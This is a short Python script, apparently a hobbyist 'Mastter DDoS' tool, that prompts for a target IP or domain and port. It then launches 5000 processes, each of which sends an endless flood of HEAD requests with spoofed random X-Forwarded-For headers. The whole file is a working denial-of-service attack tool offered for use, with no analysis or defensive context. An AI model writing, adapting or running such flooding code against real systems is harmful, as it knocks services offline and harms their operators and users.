#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
from colorama import Fore, Back, Style
from multiprocessing import Process, Manager, Pool
import urllib.parse, ssl
import sys, getopt, random, time, os
import http.client
import socket
import os
from time import sleep
import multiprocessing
import platform
os.system("clear")
print(Fore.GREEN +"З А Г Р У З К А....")
time.sleep(3.5)
os.system("clear")

print("Detecting System...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 1030000")
  except Exception as e:
    print(e)
    print("Could not start the script")
else:
  print("Your system is not Linux, You may not be able to run this script in some systems")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass
time.sleep(3.5)
os.system("clear")
print(Fore.RED +"🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼")
print(Fore.BLUE +"Mastter DDoS\n")
ip = input("IP/Domen: => ")
port = int(input("Port: => "))
url = f"http://{str(ip)}"
print("[>>>] Starting the attack [<<<]")
sleep(1)

def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

    
send2attack()
Footer
